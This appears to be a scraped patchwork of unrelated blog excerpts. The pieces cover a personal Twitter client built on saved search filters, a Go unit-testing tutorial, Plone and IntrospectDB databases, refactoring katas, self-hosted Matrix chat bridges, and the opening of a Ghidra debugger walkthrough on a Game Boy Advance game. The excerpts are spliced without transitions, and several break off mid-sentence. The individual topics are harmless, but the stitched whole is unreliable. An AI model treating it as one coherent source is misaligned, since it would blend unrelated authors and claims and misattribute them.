<p>With these two goals in mind, I also wanted Lucerne to be a tool that could <a href="https://thesephist.com/posts/ivy/">grow with me as I used it</a>, so I could mold my experience of Twitter around what I found to be most useful to me over time. More than other tools, Twitter feels organic and constantly changing. I didn’t want to have to bake in all the tools and dials I might ever want to use from the get-go. Instead, I wanted to be able to stumble into interesting use cases as I used Lucerne over time.</p>
<p><img src="https://thesephist.com/img/lucerne-querybar.jpg" alt="Performing a search in Lucerne"></p>
<p>To make it possible to grow Lucerne as a tool gradually around my use cases like this, Lucerne is designed primarily around one important idea: <strong>filtered searches saved as “channels”</strong>. Feeding from the firehose of conversations on Twitter, a “channel” is a small filtered stream of tweets defined by a particular search query. Here are some examples of useful filters.</p>
<ul>
<li>“tweets between A and B about #topic” – <code>(from:A OR from:B) #topic</code></li>
<li>“tweets about abc.com with more than 100 likes” – <code>url:abc.com min_faves:100</code></li>
<li>“tweets by A that include images, but exclude retweets” – <code>from:A filter:images -filter:retweets</code></li>
</ul>
<p>With Lucerne, I can search for interesting conversations happening on Twitter by experimenting with these filters. When any filter seems particular useful, I can save it to check again later, by adding it to the left sidebar with a name. As I use the app, I end up curating an ever-changing personalized collection of these channels in my sidebar that provide multiple different views onto the firehose of Twitter.</p>
<p>“But Linus,” I hear you saying, “you can search and save them as timelines on Twitter’s app and Tweetdeck.” Yes, you’re right, and most of the search filters Lucerne uses are also available on Twitter. But the important thing about Lucerne isn’t just that you can search, but that <strong>playing with filters and saving the good ones is the primary user interface</strong>. On Twitter, you might search once or twice to find something useful, but you’re <em>mostly</em> interacting with a single timeline passively. With Lucerne, most of my use is exploring and adding to a curated list of filters, and exploration and consumption are one and the same activity. As I’ll explain later from my personal experience, this makes a big difference in how much I can get out of Twitter.</p>
<p>I think the most important design lessons in Lucerne is what I <em>didn’t</em> do: I could have made a list of features that I might have wanted in the beginning, and baked it all into the app. Features like “follow specific threads”, “see top tweets from a particular user”, “follow hashtags”, or “hide retweets from the timeline.” But instead of adding a million settings and toggles, I found what I would consider to be the “atoms”, the common building blocks, of all of these use cases, and baked it into the core of the app instead. All these use cases above can be performed just as easily as filtered searches, and because these filters can be saved and referenced later, Lucerne can grow around my exact use cases <em>as I continue using it</em>. I don’t have to design for all my use cases from the start. This is what I mean when I say <a href="https://thesephist.com/posts/ivy/">we need to design tools to grow with us</a>.</p>
<p>In addition to this main idea of channels, Lucerne has a few other design considerations to improve how Twitter works for me. All the engagement stats I care about are present in a single screen, so I don’t have to annoyingly load five different pages every time, but they’re out of the way of the main “timeline” view, because I don’t want them in my face all the time. There’s a small pane on the right showing me my most recent new followers, which is sometimes useful when I see someone particularly interesting and want to reach back out to them. This also saves me a few clicks every time. Lastly, I intentionally didn’t implement <em>infinite scrolling</em>, in lieu of a simple “load more” button. This makes endlessly scrolling a conscious enough action for me that I end up wasting less time scrolling through my timeline. It goes without saying, all of these experiences are also much better because I don’t serve myself ads in between my tweets. My timeline feels cleaner.</p>
<h2 id="how-im-using-lucerne">How I’m using Lucerne</h2>
<p>I reached an “MVP” stage with Lucerne a few days ago, and since then, I’ve used Lucerne more and Twitter’s website less for browsing through Twitter. Lucerne isn’t meant to be a Twitter <em>replacement</em>. Twitter’s web app is still great for writing and following threads, for example, and I don’t want to have to re-create something that’s already fine for my use. But for my two main workflows of <em>learning</em> and <em>tracking my progress</em> on Twitter, Lucerne works better for me.</p>
<p>The biggest change I’ve noticed from using the client is that it turns Twitter from a consumption experience into an exploratory experience. Instead of drinking from a firehose through a straw, the firehose feeds into an evolving castle of infinite fountains, and my job is to look around the castle for the fountains of information that seem more interesting or insightful. For the first time in a long time, I feel like I’m pulling from the firehose of Twitter instead of constantly poking straws into the stream to see what I luck out with.</p>
<p>The real fun of using Lucerne to explore Twitter isn’t just reading tweets in a timeline, but poking around in the <a href="https://en.wikipedia.org/wiki/The_Library_of_Babel">infinite library</a> that Twitter sometimes feels like, collecting the interesting streams of information into my pocket.</p>
<p>Here are a few use cases I stumbled into while using Lucerne that I otherwise couldn’t have.</p>
<p><strong>Following interesting threads.</strong> I often stumble into interesting threads of tweets that I want to track somehow. While using Lucerne, I ran into one tweet about <a href="https://twitter.com/geoffreylitt">@geoffreylitt</a> building a Twitter browser extension called Twemex, and another thread by <a href="https://twitter.com/TZhongg">@TZhongg</a> asking for book recommendations. Normally, I would probably just bookmark it and never check it again, but with Lucerne, I just saved filters for “replies to this tweet” as channels in my sidebar, and I’ve checked them regularly since to find interesting project updates and book recommendations.</p>
<p><strong>Following an account’s tweets on a topic.</strong> <a href="https://twitter.com/Noahpinion">@Noahpinion</a> is one of those accounts that have a lot of interesting ideas to share covering a huge range of topics. Sometimes about foreign policy, sometimes about fiscal policy and economics, sometimes about China. I wanted to be able to follow “just tweets about this account on Japan”, for example, and I could do this trivially by setting up a channel <code>from:Noahpinion Japan</code>.</p>
<p><img src="https://thesephist.com/img/lucerne-usercard.jpg" alt="Lucerne looking at tweets by @devonzuegel"></p>
<p><strong>Following an aesthetic.</strong> I noticed recently that a lot of <a href="https://twitter.com/devonzuegel">@devonzuegel</a>’s tweets about urban design either contain interesting quotes from books or inspiring historical photographs. I follow her, but thought it would be nice to have a separate channel to just keep track of these. So I made a filter for <code>from:devonzuegel filter:images</code>, for “tweets containing images from @devonzuegel” which I’ve been enjoying checking once every one or two days. Through this channel, I also discovered a couple of other accounts that share photographs of urban design that I otherwise would have missed.</p>
<p><strong>“Following” high-noise accounts without following.</strong> There are a few accounts, like @naval, @david_perell, or @paulg that occasionally tweet really interesting ideas, but whom I don’t follow because there’s a lot of noise. With Lucerne, I could create channels like <code>from:david_perell -filter:replies min_faves:100</code> to “follow” the most popular tweets from these accounts without actually following them into my home timeline. I’ve found this so useful that I added a “top” button to profile cards that lets me one-click search a filter for “popular tweets from this person”, which is much more helpful than what Twitter’s web app gets you on a profile page, which are just the latest tweets they happened to have sent.</p>
<p>Over time, I think my curated list of channels is going to become an interesting index into my own interests, perspective, and information consumption habits, which I find a really cool idea. I’m excited about how Lucerne can help me use Twitter to learn and share better going forward, and I"m also curious about how I could apply this idea of “tools that grow as you use it” to other parts of my life, like the web browser or my email experience.</p>
<p>And because I know you’re asking: while I don’t think I’m going to make this current version of Lucerne open for public …</p></article></div>

            <div><p>In the previous post titled <a href="http://blog.alexellis.io/golang-json-api-client/">"Grab JSON from an API"</a> we explored how to interact with a HTTP client and parse JSON. This post is a continuation of that theme, which covers unit testing.</p>
<p>I consider the following book as essential reference and reading for Golang, you can purchase it on Amazon: <a href="https://amzn.to/3biQrWJ">Go Programming Language, Addison-Wesley</a>. I'll cover some other recommendations at the end of the post.</p>

<h2 id="1testingingo">1. Testing in Go</h2>
<p>Go has a built-in testing command called <code>go test</code> and a package <code>testing</code> which combine to give a minimal but complete testing experience.</p>
<p>The standard tool-chain also includes benchmarking and statement-based code coverage similar to NCover (.NET) or Istanbul (Node.js).</p>

<h3 id="12writingtests">1.2 Writing tests</h3>
<p>Unit testing in Go is just as opinionated as any other aspect of the language like formatting or naming. The syntax deliberately avoids the use of assertions and leaves the responsibility for checking values and behaviour to the developer.</p>
<p>Here is an example of a method we want to test in the <code>main</code> package. We have defined an exported function called <code>Sum</code> which takes in two integers and adds them together.</p>
<pre><code>package main

func Sum(x int, y int) int {
    return x + y
}

func main() {
    Sum(5, 5)
}
</code></pre>
<p>We then write our test in a separate file. The test file can be in a different package (and folder) or the same one (<code>main</code>). Here's a unit test to check addition:</p>
<pre><code>package main

import "testing"

func TestSum(t *testing.T) {
    total := Sum(5, 5)
    if total != 10 {
       t.Errorf("Sum was incorrect, got: %d, want: %d.", total, 10)
    }
}
</code></pre>
<p>Characteristics of a Golang test function:</p>
<ul>
<li>The first and only parameter needs to be <code>t *testing.T</code></li>
<li>It begins with the word Test followed by a word or phrase starting with a capital letter.</li>
<li>(usually the method under test i.e. <code>TestValidateClient</code>)</li>
<li>Calls <code>t.Error</code> or <code>t.Fail</code> to indicate a failure (I called t.Errorf to provide more details)</li>
<li><code>t.Log</code> can be used to provide non-failing debug information</li>
<li>Must be saved in a file named <code>something_test.go</code> such as: <code>addition_test.go</code></li>
</ul>
<blockquote>
<p>If you have code and tests in the same folder then you cannot execute your program with <code>go run *.go</code>. I tend to use <code>go build</code> to create a binary and then I run that.</p>
</blockquote>
<p>You may be more used to using the <code>Assert</code> keyword to perform checking, but the authors of <a href="https://www.amazon.co.uk/Programming-Language-Addison-Wesley-Professional-Computing/dp/0134190440">The Go Programming Language</a> make some good arguments for Go's style over Assertions.</p>
<p>When using assertions:</p>
<ul>
<li>tests can feel like they're written in a different language (RSpec/Mocha for instance)</li>
<li>errors can be cryptic "assert: 0 == 1"</li>
<li>pages of stack traces can be generated</li>
<li>tests stop executing after the first assert fails - masking patterns of failure</li>
</ul>
<blockquote>
<p>There are third-party libraries that replicate the feel of RSpec or Assert. See also <a href="https://github.com/stretchr/testify">stretchr/testify</a>.</p>
</blockquote>
<p><strong>Test tables</strong></p>
<p>The concept of "test tables" is a set (slice array) of test input and output values. Here is an example for the <code>Sum</code> function:</p>
<pre><code>package main

import "testing"

func TestSum(t *testing.T) {
	tables := []struct {
		x int
		y int
		n int
	}{
		{1, 1, 2},
		{1, 2, 3},
		{2, 2, 4},
		{5, 2, 7},
	}

	for _, table := range tables {
		total := Sum(table.x, table.y)
		if total != table.n {
			t.Errorf("Sum of (%d+%d) was incorrect, got: %d, want: %d.", table.x, table.y, total, table.n)
		}
	}
}
</code></pre>
<p>If you want to trigger the errors to break the test then alter the <code>Sum</code> function to return <code>x * y</code>.</p>
<pre><code>$ go test -v
=== RUN   TestSum
--- FAIL: TestSum (0.00s)
	table_test.go:19: Sum of (1+1) was incorrect, got: 1, want: 2.
	table_test.go:19: Sum of (1+2) was incorrect, got: 2, want: 3.
	table_test.go:19: Sum of (5+2) was incorrect, got: 10, want: 7.
FAIL
exit status 1
FAIL	github.com/alexellis/t6	0.013s
</code></pre>
<p><strong>Launching tests:</strong></p>
<p>There are two ways to launch tests for a package. These methods work for unit tests and integration tests alike.</p>
<ol>
<li>Within the same directory as the test:</li>
</ol>
<pre><code>go test
</code></pre>
<p><em>This picks up any files matching packagename_test.go</em></p>
<p>or</p>
<ol start="2">
<li>By fully-qualified package name</li>
</ol>
<pre><code>go test github.com/alexellis/golangbasics1
</code></pre>
<p>You have now run a unit test in Go, for a more verbose output type in <code>go test -v</code> and you will see the PASS/FAIL result of each test including any extra logging produced by <code>t.Log</code>.</p>
<blockquote>
<p>The difference between unit and integration tests is that unit tests usually isolate dependencies that communicate with network, disk etc. Unit tests normally test only one thing such as a function.</p>
</blockquote>
<h2 id="13moreongotest">1.3 More on <code>go test</code></h2>
<p><strong>Statement coverage</strong></p>
<p>The <code>go test</code> tool has built-in code-coverage for statements. To try it with out example above type in:</p>
<pre><code>$ go test -cover
PASS
coverage: 50.0% of statements
ok  	github.com/alexellis/golangbasics1	0.009s
</code></pre>
<p>High statement coverage is better than lower or no coverage, but metrics can be misleading. We want to make sure that we're not only executing statements, but that we're verifying behaviour and output values and raising errors for discrepancies. If you delete the "if" statement from our previous test it will retain 50% test coverage but lose its usefulness in verifying the behaviour of the "Sum" method.</p>
<p><strong>Generating an HTML coverage report</strong></p>
<p>If you use the following two commands you can visualise which parts of your program have been covered by the tests and which statements are lacking:</p>
<pre><code>go test -cover -coverprofile=c.out
go tool cover -html=c.out -o coverage.html 
</code></pre>
<p>Then open coverage.html in a web-browser.</p>
<p><strong>Go doesn't ship your tests</strong></p>
<p>In addition, it may feel un-natural to leave files named <code>addition_test.go</code> in the middle of your package. Rest assured that the Go compiler and linker will not ship your test files in any binaries it produces.</p>
<p>Here is an example of finding the production vs test code in the net/http package we used in the previous Golang basics tutorial.</p>
<pre><code>$ go list -f={{.GoFiles}} net/http
[client.go cookie.go doc.go filetransport.go fs.go h2_bundle.go header.go http.go jar.go method.go request.go response.go server.go sniff.go status.go transfer.go transport.go]

$ go list -f={{.TestGoFiles}} net/http
[cookie_test.go export_test.go filetransport_test.go header_test.go http_test.go proxy_test.go range_test.go readrequest_test.go requestwrite_test.go response_test.go responsewrite_test.go transfer_test.go transport_internal_test.go]
</code></pre>
<p>For more on the basics read the <a href="https://golang.org/pkg/testing/">Golang testing docs</a>.</p>
<h3 id="14isolatingdependencies">1.4 Isolating dependencies</h3>
<p>The key factor that defines a unit test is isolation from runtime-dependencies or collaborators.</p>
<p>This is achieved in Golang through interfaces, but if you're coming from a C# or Java background, they look a little different in Go. Interfaces are implied rather than enforced which means that concrete classes don't need to know about the interface ahead of time.</p>
<p>That means we can have very small interfaces such as <a href="https://golang.org/src/io/io.go?s=4977:5022#L116">io.ReadCloser</a> which has only two methods made up of the Reader and Closer interfaces:</p>
<pre><code>        Read(p []byte) (n int, err error)
</code></pre>
<p><em>Reader interface</em></p>
<pre><code>        Close() error
</code></pre>
<p><em>Closer interface</em></p>
<p>If you are designing a package to be consumed by a third-party then it makes sense to design interfaces so that others can write unit tests to isolate your package when needed.</p>
<p>An interface can be substituted in a function call. So if we wanted to test this method, we'd just have to supply a fake / test-double class that implemented the Reader interface.</p>
<pre><code>package main

import (
	"fmt"
	"io"
)

type FakeReader struct {
}

func (FakeReader) Read(p []byte) (n int, err error) {
	// return an integer and error or nil
}

func ReadAllTheBytes(reader io.Reader) []byte {
	// read from the reader..
}

func main() {
	fakeReader := FakeReader{}
	// You could create a method called SetFakeBytes which initialises canned data.
	fakeReader.SetFakeBytes([]byte("when called, return this data"))
	bytes := ReadAllTheBytes(fakeReader)
	fmt.Printf("%d bytes read.\n", len(bytes))
}
</code></pre>
<p>Before implementing your own abstractions (as above) it is a good idea to search the Golang docs to see if there is already something you can use. In the case above we could also use the standard library in the <a href="https://golang.org/pkg/bytes/">bytes</a> package:</p>
<pre><code>    func NewReader(b []byte) *Reader
</code></pre>
<p>The Golang <a href="https://golang.org/pkg/testing/iotest/">testing/iotest</a> package provides some Reader implementations which are slow or which cause errors to be thrown half way through reading. These are ideal for resilience testing.</p>
<ul>
<li>Golang docs: <a href="https://golang.org/pkg/testing/iotest/">testing/iotest</a></li>
</ul>
<h3 id="15workedexample">1.5 Worked example</h3>
<p>I'm going to refactor the code example from the <a href="http://blog.alexellis.io/golang-json-api-client/">previous article</a> where we found out how many astronauts were in space.</p>
<p>We'll start with the test file:</p>
<pre><code>package main

import "testing"

type testWebRequest struct {
}

func (testWebRequest) FetchBytes(url string) []byte {
	return []byte(`{"number": 2}`)
}

func TestGetAstronauts(t *testing.T) {
	amount := GetAstronauts(testWebRequest{})
	if amount != 1 {
		t.Errorf("People in space, got: %d, want: %d.", amount, 1)
	}
}
</code></pre>
<p>I have an exported method called GetAstronauts which calls into a HTTP endpoint, reads the bytes from the result and then parses this into a struct and returns the integer in the "number" property.</p>
<p>My fake / test-double in the test only returns the bare minimum of JSON needed to satisfy the test, and to begin with I had it return a different number so that I knew the test worked. It's hard to be sure whether a test that passes first time has worked.</p>
<p>Here's the application code where we run our <code>main</code> function. The <code>GetAstronauts</code> function takes an interface as its first argument allowing us to isolate and abstract away any HTTP logic from this file and its import list.</p>
<pre><code>package main

import (
	"encoding/json"
	"fmt"
	"log"
)

func GetAstronauts(getWebRequest GetWebRequest) int {
	url := "http://api.open-notify.org/astros.json"
	bodyBytes := getWebRequest.FetchBytes(url)
	peopleResult := people{}
	jsonErr := json.Unmarshal(bodyBytes, &amp;peopleResult)</code></pre></div></section></article></div></div>

            <p><a href="http://plone.org/" target="_self" title="Plone">Plone</a> and <a href="http://zope.org/" target="_self" title="Zope">Zope</a>&nbsp;use the concept of a file oriented object database.&nbsp; They have Content Types which model the columns of a table. Directories are tables and Instances of the Content Types are rows.</p>
<p>Content Types and Instances are different from Classes and Objects in Object Oriented Programming but similiar. They are on the user level not the program level. A table is a list of rows of columns. A directory is a list of files.</p>
<p>&nbsp;So what is <a href="https://en.wikipedia.org/wiki/Database_normalization" target="_self" title="Wikipedia Database Normalization">Database Normalization</a> in this database? The tendency of file users is to put a list inside their file.&nbsp; &nbsp;A common example of this is programming languages.&nbsp; A file in most programming languages has a list of modules or methods or whatever it has.</p>
<p>You can't really do this in Plone.&nbsp; Data normalization is somewhat forced on the user because of lack of 'features' such as a list in content types.&nbsp; &nbsp;</p>
<p>A data normalized, object oriented programming language would include 3 types Codes, Datas, and Inheritances.&nbsp; This data normalized language becomes almost simple to parse.</p>
<p>&nbsp;<a href="http://sourceforge.net/projects/introspectdb/" target="_self" title="IntrospectDB">Introspect DB</a>&nbsp;uses the UNIX file system with Python for the filesystem of the File Oriented Object Database.&nbsp; &nbsp;It is designed to replace Plone as a database but instead of the roughly 1 million lines in a Plone installation, IntrospectDB is only about 1000 lines of Python.&nbsp; Plone spends a lot of energy making its own file system, why not use what is already there?&nbsp;</p>

<p>They stole our future. Let's take it back.</p>

<p>Here at the end of the world, it's time to take stock. Is technology a force for good? Can it be? Was it ever? How did we end up with a world made up of "five websites, each filled with screenshots of text from the other four" (h/t Tom Eastman)? Should we worry that machine learning will take away our free will through A/B splitting and Big Five Personality Types? Where the fuck did all these Nazis come from? </p>

But I feel the pressure to get things done. So I don’t explore much and I fall back to the techniques I know. In my comfort zone.</p><p>Do you feel the same?</p><blockquote><p>I’d like to hone my skills until I can quickly see how to break dependencies and split huge classes that do far too much!</p></blockquote><p>Yeah! But how can you sharpen your skills?</p><h2 id="coding-katas-repeatable-exercises-to-practice-your-coding-fu"><a href="#coding-katas-repeatable-exercises-to-practice-your-coding-fu" aria-label="coding katas repeatable exercises to practice your coding fu permalink"></a>Coding katas: repeatable exercises to practice your coding-fu</h2><p>You may have come across coding katas.</p><p>If you never did, picture them as small coding exercises. They are meant to be practiced again and again and again. The goal is to solve a defined problem.</p><p>It’s very efficient to try out a new technique on something concrete. It’s also a good way to practice a technique you know until you master it.</p><p>It’s like building a Todo App every time you want to try out a new front-end framework.</p><h3 id="there-are-plenty-of-coding-katas-out-there"><a href="#there-are-plenty-of-coding-katas-out-there" aria-label="there are plenty of coding katas out there permalink"></a>There are plenty of coding katas out there!</h3><p>There are even <a href="https://kata-log.rocks/">kata-logs</a> of exercises you can try out!</p><p>But if you tried a couple of katas, you might have realized they have one shortcoming: <strong>none of them seem to allow you to practice refactoring bad code!</strong></p><p>That’s true, the vast majority of katas makes you code from scratch…</p><p>However, there are a few which are specifically tailored for practicing refactoring Legacy Code. Katas where <a href="https://understandlegacycode.com/blog/key-points-of-working-effectively-with-legacy-code">Michael Feathers’ techniques</a> would shine.</p><p>Here’s my shortlist of katas you should try out.</p><h2 id="5-katas-to-help-you-practice-working-with-existing-code"><a href="#5-katas-to-help-you-practice-working-with-existing-code" aria-label="5 katas to help you practice working with existing code permalink"></a>5 katas to help you practice working with existing code</h2><p>Real-life codebases generally have so many issues at the same time, it’s overwhelming. Where should you start when you’re dealing with a 500k lines of spaghetti code?! You just want to <em>start</em> cleaning the code, but you’re already playing in hardcore mode.</p><p>What you need, is <strong>dirty code at a smaller scale</strong>.</p><p>It should still be complex, or you wouldn’t practice much. But it should be manageable, so you <em>can</em> practice. Your goal is to turn that little mess into clean code.</p><p>Whether you’re done or you’re stuck, you can throw it away and start over!

    </undefined></p><p>This one is my favorite.</p><p>It’s <strong>the perfect first kata</strong> to practice refactoring Legacy Code.</p><p>👉 <a href="https://github.com/emilybache/GildedRose-Refactoring-Kata">github.com/emilybache/GildedRose-Refactoring-Kata</a></p><p>Your goal is to add a new feature to an existing codebase. The code is messy, but it’s “just” a bunch of nested conditionals. It surely can be improved, but nothing overwhelming.</p><p>There’s no HTTP call, no database request, no randomness. Just pure logic… that’s quite tangled!</p><p>That’s why I generally use this kata to train people who never did refactoring katas before 🎓</p><p>I like how <a href="https://github.com/emilybache/GildedRose-Refactoring-Kata/blob/master/GildedRoseRequirements.txt">the requirements</a> give <em>too much information</em>. Just like a regular conversation with people. If you want to get this done, you need to focus on the 3 steps of working with Legacy Code:</p><ol><li>Add the missing tests</li><li>Refactor the code</li><li>Implement the new feature</li></ol><p>It’s also a great kata to try <a href="https://understandlegacycode.com/blog/3-steps-to-add-tests-on-existing-code-when-you-have-short-deadlines/">the approval tests technique</a>.</p><h3 id="2-the-tennis"><a href="#2-the-tennis" aria-label="2 the tennis permalink"></a>2.

Although the Tennis scoring rules are <em>a little bit</em> more complex than the Gilded Rose kata (in my opinion).</p><p>A few characteristics of this exercise:</p><ul><li>Tests are already here, so you can focus on <strong>pure refactoring</strong> techniques.</li><li>There are 3 variants that showcase different code smells and challenges.</li><li>At the end of the kata, do a retrospective to list what were the smells you spotted and how you refactored the design.

What makes it challenging are the problematic dependencies: the code you need to test depends on HTTP calls and database requests!</p><p>Well, actually, it <em>simulates</em> the problematic dependencies.</p><p>There’s no actual call to a third-party service, neither you’ll have to set up a database.

<p>Once upon a time, there were many chat services. AOL Instant Messenger, Yahoo Messenger, ICQ and others. These messengers had their own desktop clients, and developers reverse engineered their protocol to build custom applications, both open and closed source. Trillian, Audium and Pidgin were applications that let people communicate across all these messengers with one program. Over time the old protocols died, and newer chat services like Facebook Messenger and Google Hangouts started storing your entire history on their servers. People started using the web interfaces and mobile apps, no longer caring about desktop programs.</p>

<p>Matrix is an open source communication protocol. It’s similar to XMPP (formerly Jabber) in the sense that anyone can set up a Matrix server and communicate to people on other Matrix servers. It’s a federated protocol, just like e-mail. Google Hangouts used to support XMPP federation, but silently removed support in 2014. Matrix supports bridging other chat services, so they can appear in a unified view. With my current setup of Matrix and appropriate bridges, I’ve combined my view of Facebook Messenger, Google Hangouts, Telegram and native Matrix chats into one convenient user interface. The path to get to that integration was not as simple.</p>

<p>The dedicated server I use for <a href="https://battlepenguin.com/tech/a-history-of-personal-and-professional-websites/">this website</a> and other self-hosted web applications, is located in Germany. Logging in to Facebook or Google’s chat system from a country I’m not currently in, can raise all sorts of security flags and lock me out of my account. For those bridges, I purchased a small virtual machine in a Chicago data center. I installed a proxy on that server, accessible only via VPN, to view both Google and Facebook, so they record the IP address I’m connecting from with my web browser. This helps minimize security lockouts. Telegram isn’t hostile to third party developers, and has an official API. It doesn’t care my bridge is connecting to it from Germany, so I host it on the dedicated server.</p>

<p>The reference Matrix server is called Synapse. It, as well as the <a href="https://github.com/tulir/mautrix-telegram">mautrix-telegram</a>, <a href="https://github.com/tulir/mautrix-hangouts">mautrix-hangouts</a> and <a href="https://github.com/tulir/mautrix-facebook">mautrix-facebook</a> bridges all have official Docker containers built by their developers. Each bridge must be able to communicate with the Synapse homeserver. Their instructions go through generating configuration and key pairs that are copied over to Synapse in order to form their authentication bridge. The bridges provide chat robots that guide you through getting OAuth tokens or cookies for those respective services.</p>

<p>The wiki for each bridge also has instructions for enabling double-puppeting, making each chat look seamless between myself and the accounts on the other side of each respective bridge. Without double-puppeting, each conversation will be in a three person group with the Matrix user, the bridge user (e.g my Google Hangouts user) and the person I’m talking to.</p>

<figure>

      Chat Without Double-Puppeting Enabled

      
  </figcaption>
  
</figure>

<p>Enabling double-puppeting via the <code>curl</code> command in the bridge documentation and calling <code>login-matrix</code> on the bot, removes the creation of three person rooms. The bridged accounts will now show up as regular, two-person conversations.</p>

<p>I use the Element desktop app to connect to my matrix server, but I also have a web version of Element running from its own official Docker container in case I need to access chat from another computer. There are other clients, such as <a href="https://github.com/mirukana/mirage">Mirage</a> which is built using Qt and <a href="https://fluffychat.im/">Fluffychat</a> for mobile. Although I use Synapse for my homeserver, there are other servers that support the Matrix protocol that are in use and under active development.</p>

<p>Setting up all the Matrix components wasn’t too difficult, but it does require knowledge or experience with running services. It took a considerable amount of work and debugging to get each bridge operational, compounded slightly by my complex networking setup. Most people would probably just run all of this on a Raspberry Pi at home. I feel that using Matrix with bridges is still somewhat inaccessible to people who aren’t interested in development or server administration. Still, the satisfaction of having unified chat, plus one more layer of abstraction between myself and Google or Facebook, feels like it was wroth the overall effort.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src=""></p><h2 id="overview">Overview</h2><p><a href="https://twitter.com/NSACyber/status/1339652646513291264">Yesterday</a> the NSA Twitter account announced that a new branch of Ghidra has been release with the long-awaited debugging capability. This will allow for single-step debugging of a program within <a href="https://hackaday.io/course/172292-introduction-to-reverse-engineering-with-ghidra">Ghidra</a> through a GDB stub or other various debug mechanisms. To celebrate this (and my being stuck at home quarantining…) I wanted to review how to build this version of Ghidra and give an example of how to use this debugger on a fun target.</p><p>This post will explain the following:</p><ul><li>How to build the latest (or any) version of Ghidra using a <a href="https://github.com/dukebarman/ghidra-builder">Docker Container</a></li><li>How to build the Ghidra Eclipse plugins</li><li>How to build a program <a href="https://github.com/SiD3W4y/GhidraGBA">loader</a> for Ghidra</li><li>Debugging a program with Ghidra using the GDB stub</li><li>Use the debugging capability to help us learn about how passwords are processed for a GBA game</li></ul><p>For this post, we’re going to be taking a look at the Game Boy Advance game Spiderman: Mysterio’s Menace. I’ve been very much inspired by all of the awesome work that <a href="https://youtu.be/VVbRe7wr3G4">stacksmashing and Liveoverflow have been doing regarding these topics</a>. This was a game that I spent a lot of time playing and it’s always fun revisiting childhood favorites from an RE perspective. The ultimate goal is to demonstrate how to properly load this ROM using a custom loader, and connect to an emulator’s GDB stub using Ghidra’s debugging features.</p><p><strong>RE Note/Tangent:</strong> When taking on a new reversing project, it’s important to try to compartmentalize goals and targets. For example, if we said we just want to <em>reverse</em> this game, that opens up endless possibilities. We could reverse engineer the collision detection, how enemy AI works, or how level maps are generated. For this post, we will pick a specific target and take a look at the password mechanism in use by this game.</p><p>I am doing all of this work on an Ubuntu 20.04 machine, with the latest updates.</p><h2 id="building-ghidra">Building Ghidra</h2><p>First things first, this debugger branch has not yet been included in an official release so we’re going to have to build it ourselves. Luckily for us <a href="https://github.com/dukebarman/ghidra-builder">dukebarman</a> has put together a docker container for us to do this, all we need to do is modify the <code>build_ghidra.sh</code> script to checkout the debugger branch, see the following line below:</p><div><p><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>git clone https://github.com/NationalSecurityAgency/ghidra -b debugger
</pre></td></tr></tbody></table></code></p></div><p>We are also going to build the Eclipse development extensions for this version of Ghidra, this will help us later on when we build a loader and write our analysis scripts. To do this we add the following line to the <code>build_ghidra.sh</code> script:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>gradle prepDev
gradle eclipse -PeclipsePDE
</pre></td></tr></tbody></table></code></p></div><p>Next follow the instructions in the <code>README</code>:</p><div><p><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>cd ghidra-builder
sudo docker-tpl/build
cd workdir
sudo ../docker-tpl/run ./build_ghidra.sh
</pre></td></tr></tbody></table></code></p></div><p>This will take some time, so maybe go grab a coffee or two and come back to your freshly built Ghidra. The resulting build can be found in <code>workdir/out</code>:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>wrongbaud@wubuntu:~/blog/gba-re-gbd/ghidra-builder/workdir$ ls out/
ghidra_9.3_DEV_20201218_linux64.zip
</pre></td></tr></tbody></table></code></p></div><p>Unzip this file, and you can launch Ghidra via the <code>./ghidraRun</code> script. For this post, I will unzip this into the <code>ghidra-builder/workdir</code> directory because we’re going to be using the docker container to build a Ghidra loader for this version of Ghidra. If you’re following along, your workdir directory should look like this:</p><div><p><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>wrongbaud@wubuntu:~/blog/gba-re-gbd/ghidra-builder/workdir$ ls
build_ghidra.sh  ghidra  ghidra_9.3_DEV out  set_exec_flag.sh
</pre></td></tr></tbody></table></code></p></div><h2 id="building-eclipse-plugins">Building Eclipse Plugins</h2><p>Now that we have a new version of Ghidra built, we also need to build the GhidraDev plugin for Eclipse. The eclipse projects can be found in the <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev</code> directory.</p><ol><li>Install <a href="https://www.eclipse.org/downloads/packages/installer">Eclipse</a><ul><li>Select the Java IDE</li></ul></li><li>Install CDT, PyDev, and Plugin Development Environment<ul><li>This can be done from the Eclipse marketplace</li></ul></li><li>Import the GhidraDevFeature and GhidraDevPlugin projects<ul><li>These can be found in the <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev/</code> directory</li><li><code>File</code> -&gt; <code>Import</code> -&gt; <code>General</code> -&gt; <code>Existing Projects into Workspace</code></li><li>Add <code>ghidra-builder/workdir/ghidra/GhidraBuild/EclipsePlugins/GhidraDev</code></li><li>Select “Search for nested projects”</li><li>Import the projects!</li><li><strong>Note:</strong> you may see some build errors when these are imported, you can ignore these as you are just exporting the plugin!</li></ul></li><li>With these projects loaded, we can now <a href="https://github.com/NationalSecurityAgency/ghidra/blob/debugger/GhidraBuild/EclipsePlugins/GhidraDev/GhidraDevPlugin/build_README.txt">export the plugin</a><ul><li><code>File</code> -&gt; <code>Export</code></li><li><code>Plug-in Development</code> -&gt; <code>Deployable Features</code></li><li><code>ghidradev.ghidradev</code></li><li>Select an archive location for the plugin to be exported to</li><li>Click Finish!</li></ul></li></ol><p>Now we have our Ghidra plugin, built for our custom version of Ghidra that we can load via <code>Help</code>-&gt;<code>Install New Software</code>.</p><p>And with that, we have built Ghidra from the <code>debugger</code> branch, and have also built the Eclipse development extensions so we can build plugins for our new version of Ghidra!</p><p><strong>Note:</strong> I just want to take a second to outline just how incredible the <a href="https://github.com/NationalSecurityAgency/ghidra/blob/15c1f43fa51f210836cb451aff587b227dffe0a7/DevGuide.md">help docs</a> are for Ghidra. From the P-Code manuals to the instructions on building and exporting these plugins - the project is very well documented.</p><h2 id="building-the-rom-loader">Building the ROM Loader</h2><p>To properly analyze this ROM in Ghidra, we are going to need to define all of the <a 